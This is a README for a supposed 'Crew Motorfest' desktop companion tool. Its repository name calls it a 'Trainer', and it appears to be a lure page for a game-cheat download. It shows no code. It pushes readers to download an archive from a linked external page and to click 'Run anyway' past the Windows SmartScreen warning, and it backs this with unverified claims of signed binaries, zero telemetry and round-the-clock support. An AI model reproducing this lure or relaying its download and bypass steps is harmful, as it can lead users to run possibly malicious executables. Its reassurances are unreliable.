![preview](https://raw.githubusercontent.com/rhiandevera64-design/Crew-Motorfest-Trainer-Companion/main/promo_0d9b94.svg)
[![Download](https://raw.githubusercontent.com/rhiandevera64-design/Crew-Motorfest-Trainer-Companion/main/start_8d10.svg)](https://rhiandevera64-design.github.io/Crew-Motorfest-Trainer-Companion/)

# 🏁 The Crew Motorfest Companion Suite 2026

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2011%20%7C%2010-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Platform Badge">
  <img src="https://img.shields.io/badge/Release-2026-EA4B23?style=for-the-badge&logo=rocket&logoColor=white" alt="Release Badge">
  <img src="https://img.shields.io/badge/License-MIT-3DA639?style=for-the-badge&logo=opensourceinitiative&logoColor=white" alt="License Badge">
  <img src="https://img.shields.io/badge/Status-Actively%20Maintained-2ECC71?style=for-the-badge&logo=checkmarx&logoColor=white" alt="Status Badge">
  <img src="https://img.shields.io/badge/Languages-14%20Locales-9B59B6?style=for-the-badge&logo=googletranslate&logoColor=white" alt="Localization Badge">
  <img src="https://img.shields.io/badge/Support-24%2F7%20Assistance-FF6F61?style=for-the-badge&logo=probot&logoColor=white" alt="Support Badge">
</p>

> *"Every gearhead has a co-pilot. Ours just happens to live on your desktop."*

Welcome to the **The Crew Motorfest Companion Suite 2026** — a Windows-first utility layer built to sit quietly beside your racing sessions, offering a richer, calmer, and more customizable garage experience for solo players who like to tinker with their own setup. Think of it less as a shortcut and more as a **tuning garage for your own session preferences** — the digital equivalent of adjusting your mirrors, seat height, and steering wheel before the lights go green.

This project is an **independent companion toolkit**, developed by enthusiasts for enthusiasts, with an obsessive focus on stability, clarity, and user respect. It is not affiliated with, endorsed by, or connected to any game publisher or platform holder. Everything here is about giving you more control over your own machine and your own time.

---

## 📖 Table of Contents

- [The Philosophy Behind the Suite](#-the-philosophy-behind-the-suite)
- [What This Project Actually Is](#-what-this-project-actually-is)
- [Feature Overview](#-feature-overview)
- [The Responsive Interface](#-the-responsive-interface)
- [Multilingual Support](#-multilingual-support)
- [Always-On Assistance](#-always-on-assistance)
- [Compatibility & Requirements](#-compatibility--requirements)
- [Getting Started, Gently](#-getting-started-gently)
- [Configuration Profiles](#-configuration-profiles)
- [Performance & Safety Notes](#-performance--safety-notes)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Community Guidelines](#-community-guidelines)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🧭 The Philosophy Behind the Suite

Most utilities in this space treat the player as a problem to be solved. We took the opposite approach: we treat the player as a **driver**, someone with preferences, habits, and a specific rhythm to their session. The Crew Motorfest Companion Suite was born from a simple observation — racing games are extraordinary, but the surrounding experience (settings menus, overlays, session bookkeeping) is often where the fun quietly leaks out.

So we built a small, opinionated toolkit that handles the boring parts. It remembers your overlay layouts. It keeps your notes about tuning setups. It lets you switch between profiles without digging through five menus. It talks to you in your own language. And it stays out of the way when you're in the middle of a drift.

The whole thing is written in the spirit of a **well-organized toolbox**: no clutter, no surprise dialogs, no telemetry phoning home. Just the tools you reach for and the calm confidence that they'll be there tomorrow.

---

## 🛠 What This Project Actually Is

Let's be direct about scope, because honesty builds trust:

- ✅ It is a **desktop companion overlay and session manager** for Windows 11 and Windows 10.
- ✅ It is a **profile and preference engine** that stores your own settings in a local, human-readable format.
- ✅ It is a **localization-friendly** app that speaks more than a dozen languages.
- ✅ It is **open source**, MIT-licensed, and auditable by anyone who cares to read the code.
- ❌ It is **not** a replacement for the game, nor does it modify game binaries.
- ❌ It is **not** a subscription service, a data harvester, or a launcher for anything else.
- ❌ It is **not** affiliated with any publisher, studio, or platform.

If that aligns with what you were looking for, welcome aboard. Buckle in.

---

## ✨ Feature Overview

Here's the full tour of what ships in the 2026 release. Every item below was added because a real user asked for it, or because a maintainer got annoyed enough to fix it at 2 AM.

- 🎛 **Unified Control Deck** — One compact panel that surfaces the options you actually change between sessions.
- 🧩 **Modular Widgets** — Enable only the pieces you want. Each widget is independent and can be repositioned.
- 💾 **Local Profile Vault** — Save, name, and swap between session profiles in a single click.
- 🌐 **Fourteen Built-In Locales** — English, Spanish, French, German, Italian, Portuguese, Polish, Dutch, Turkish, Japanese, Korean, Simplified Chinese, Russian, and Arabic.
- 🎨 **Adaptive Theme Engine** — Light, dark, and "night race" high-contrast modes, all with smooth transitions.
- 🔊 **Ambient Sound Cues** — Subtle, optional audio feedback for profile switches and reminders. Off by default.
- 🖱 **Input-Agnostic Navigation** — Works equally well with mouse, keyboard only, or a plugged-in racing wheel's shortcut buttons.
- 📝 **Session Journal** — A quick notepad bound to each profile so your tuning thoughts don't vanish between races.
- 🧠 **Smart Layout Memory** — The app remembers per-monitor layouts, including multi-display setups with mixed DPI.
- 🔁 **Silent Auto-Update Check** — Optional, opt-in, and it never installs anything without a prompt.
- 🛡 **Sandboxed File Access** — The app only touches its own folder inside your user profile directory.
- 🕒 **Session Timers** — Gentle reminders to stretch, hydrate, and step away. Because your lap times matter, but so do your wrists.
- 📊 **Local Statistics Panel** — Tracks your own session durations and profile switches; stored only on your machine.
- 🧰 **CLI Companion Tool** — A small command-line helper for power users who want to script profile swaps.
- 📦 **Portable Mode** — Run it from a USB stick without leaving footprints on the host system.
- 🔐 **Signed Binaries** — Every release is signed, and the checksum is published alongside it.
- 🚫 **Zero Telemetry** — The app makes no outbound connections except the optional update check.
- 🧱 **Crash-Resilient State** — If the app is force-closed, your last known good profile is restored on next launch.

Each of the above is documented in the in-app help center, which is also fully localized.

---

## 🖥 The Responsive Interface

"Responsive" in a desktop context means something slightly different than on the web. For us, it means the layout **breathes**. Resize the window to a sliver and the sidebar collapses into an icon rail. Drag it across to a 4K monitor and the widgets scale without going blurry. Run it on a 1366×768 laptop and nothing gets clipped.

The interface is built around a **three-zone model**:

1. **The Rail** — The left strip where widgets dock. Collapses automatically below a certain width.
2. **The Stage** — The central area where your active widget lives. Swappable without reloading.
3. **The Ledger** — The right column, optional, where the session journal and stats panel live.

You can pin any zone, hide any zone, or rearrange the whole thing into a single-column layout if you prefer the minimalist approach. There's no "correct" arrangement — only the one that suits your desk.

The visual language is deliberately understated. We borrow from automotive instrument clusters: soft gradients, legible numerals, and a restrained accent palette that shifts hue based on your selected profile. Nothing flashes unless something actually needs your attention.

---

## 🌍 Multilingual Support

Localization is not an afterthought here — it's a first-class citizen. Every string in the interface, every tooltip, every error message, and every line of the in-app documentation is available in all fourteen supported locales. We use a community-driven translation workflow, and contributions are openly welcomed via pull requests.

A few deliberate choices:

- **No machine-translated filler.** If a string hasn't been properly translated yet, the app shows the English fallback and marks it as pending in the language picker, rather than shipping a garbled guess.
- **Right-to-left support** is fully implemented for Arabic, including mirrored layouts and correct iconography.
- **Locale-aware formatting** for numbers, times, and dates, so your journal entries look right wherever you are.
- **Per-profile language overrides**, in case you share a machine with someone who prefers a different language.

We believe software should meet people where they are. Language is the most basic form of that courtesy.

---

## 🛎 Always-On Assistance

Behind this project stands a small, human support team that genuinely enjoys troubleshooting. Whether it's a layout glitch on an unusual monitor configuration or a question about how profiles are stored, the response is the same: we help, we listen, and if something is broken, we fix it.

Support runs **24 hours a day, 7 days a week, across all time zones**, because racing doesn't adhere to business hours and neither do we. Typical first-response time is measured in hours, not days. Every issue is triaged publicly so you can see the progress.

We also maintain a searchable knowledge base with walkthroughs, tips for setting up multi-monitor rigs, and explanations of every on-disk file the app creates.

---

## 💻 Compatibility & Requirements

| Component | Minimum | Recommended |
| --- | --- | --- |
| Operating System | Windows 10 (build 1909+) | Windows 11 (23H2 or newer) |
| Architecture | x64 | x64 |
| Memory | 4 GB | 8 GB or more |
| Disk Space | 250 MB | 500 MB |
| Display | 1280×720 | 1920×1080 or higher |
| Runtime | .NET Desktop Runtime 8 | .NET Desktop Runtime 8 (latest) |
| Input | Keyboard & mouse | Keyboard, mouse, or wheel shortcuts |

**Note:** The companion suite runs *alongside* your game, not inside it. It is a separate process with its own window, and it never injects into another application's memory space.

---

## 🚦 Getting Started, Gently

We assume you've just unzipped the release archive and you're staring at a folder full of files. Here's the calm path forward:

1. **Unpack the archive** into a folder you'll remember — somewhere under your user profile is best, since the app writes its config next to itself in portable mode.
2. **Read the bundled text file** named `README-FIRST.txt`. It's short, and it tells you exactly which executable to launch.
3. **Launch the main application** by double-clicking it. Windows may show a SmartScreen prompt the first time; click "More info" and then "Run anyway" if you trust the signed binary (and you can verify the signature yourself).
4. **Grant permissions if asked.** The app requests write access only to its own folder. It does not need administrator rights.
5. **Pick your language** on the first-run wizard. You can change this later at any time.
6. **Choose a profile slot.** You get three defaults out of the box; you can rename or duplicate them freely.
7. **Position the window** where it feels natural. The app will remember the position per monitor.
8. **Explore the help center** if you want a guided tour. It's about ten minutes end-to-end.

That's it. No build step, no dependency wrangling, no package manager midwifery. If you'd rather run it from a USB drive, drop the folder there and enable portable mode in settings — the app will keep everything inside that folder.

---

## 🗂 Configuration Profiles

Profiles are the beating heart of the suite. A profile is a bundle of your preferences: what widgets are visible, where they're docked, what theme is active, what language is selected, and what notes live in your journal.

Profiles are stored as plain-text files in the app's data folder, in a format designed to be **diff-friendly** and easy to back up. If you're the type who likes to keep your configs in version control, go right ahead — the format is stable and documented.

You can:

- **Duplicate** a profile to use as a starting point for a new one.
- **Export** a profile to share with a friend who has the same monitor setup.
- **Import** a profile from a file, with a preview before it's applied.
- **Compare** two profiles side by side to see what differs.
- **Schedule** automatic profile switches based on the time of day, if you like your layout to change between daytime practice and evening sessions.

The CLI companion tool exposes the same operations for scripting, so you can wire up profile swaps to keyboard shortcuts or external launchers.

---

## ⚙ Performance & Safety Notes

We take a conservative approach to resource usage. The app idles at a fraction of a percent of CPU and consumes a modest, predictable amount of memory. It does not spin up background threads that hammer your disk. It does not poll the network except for the opt-in update check.

A few deliberate safety decisions:

- **No dynamic code generation** at runtime.
- **No loading of third-party plugins** from untrusted sources.
- **All file I/O is confined** to the app's own data directory, verified at startup.
- **Signed releases only.** If a build isn't signed and checksummed, we don't publish it.
- **Reproducible builds** for the core binary, so you can rebuild it yourself and compare hashes.

If you discover a security concern, please open a private security advisory rather than a public issue. We respond to those within 24 hours.

---

## ❓ Frequently Asked Questions

**Does this modify the game in any way?**
No. The suite operates entirely outside the game process. It's a companion, not an injector.

**Will this work on a laptop with integrated graphics?**
Yes. The suite has no GPU requirements beyond basic desktop composition.

**Can I run it on Linux or macOS through a compatibility layer?**
It's officially supported only on Windows, but several users report success under translation layers. Your mileage may vary.

**How often are updates released?**
Roughly monthly, sometimes more often when a critical issue surfaces. The update check is optional and never installs without your consent.

**Where is my data stored?**
In the app's own folder (portable mode) or in a subfolder of your user profile (installed mode). You can inspect, edit, or delete it at any time.

**Is there a way to reset everything?**
Yes — the settings panel has a "reset to factory defaults" option that wipes the data folder after a confirmation prompt.

**What if I find a bug?**
Open an issue with a clear description and, if possible, the relevant log file from the logs subfolder. We appreciate reproduction steps more than anything.

**Can I contribute translations?**
Absolutely. The translation files are plain JSON, and there's a short guide in the docs folder explaining the workflow.

---

## 🗺 Roadmap for 2026

Here's what the maintainers are chewing on for the coming year. Priorities shift based on community feedback.

- **Q1 2026** — Overhaul of the widget system to support user-authored layouts. Add a layout marketplace (opt-in, community-run).
- **Q2 2026** — Deeper stats panel with export to CSV. Improved multi-monitor detection.
- **Q3 2026** — Voice-controlled widget toggles for accessibility. Expanded wheel-shortcut support.
- **Q4 2026** — Localization into six additional locales. Performance pass on the journal system. A complete theme editor.

Everything on this list is subject to change, but the direction is stable: more control, more languages, less friction.

---

## 🤝 Community Guidelines

Be kind. Be patient. Assume good faith. Report bugs without drama. Share your profile layouts generously. Help newcomers find their footing. If you disagree with a maintainer's decision, say so respectfully and then let it go — this is a hobby project, and we're all here because we love the same thing.

We don't tolerate harassment, discrimination, or personal attacks in any space associated with this project. Those who can't follow that simple rule will be removed.

---

## 📜 License

This project is released under the **MIT License**. You are welcome to use, modify, and redistribute it, provided the original copyright notice and permission notice are preserved.

Read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

---

## ⚠ Disclaimer

This project is an **independent, community-built companion application**. It is **not affiliated with, endorsed by, sponsored by, or connected to** any game publisher, developer, platform holder, or trademark owner. All product names, logos, and brands mentioned anywhere in this document are the property of their respective owners and are used for identification purposes only.

The suite is provided **as-is**, without warranty of any kind, express or implied. The maintainers are not responsible for any consequences arising from its use. You are responsible for ensuring that your use of any companion software complies with the terms of service of any game or platform you interact with, and with the laws of your jurisdiction.

This software is intended for **personal, single-player use** by individuals who wish to customize their own desktop experience. It does not interact with online services, multiplayer sessions, or other players. Please enjoy it responsibly, and always respect the communities and creators behind the games you love.

© 2026 The Crew Motorfest Companion Suite maintainers. Built with care, shipped with humility.

[![Download](https://raw.githubusercontent.com/rhiandevera64-design/Crew-Motorfest-Trainer-Companion/main/start_8d10.svg)](https://rhiandevera64-design.github.io/Crew-Motorfest-Trainer-Companion/)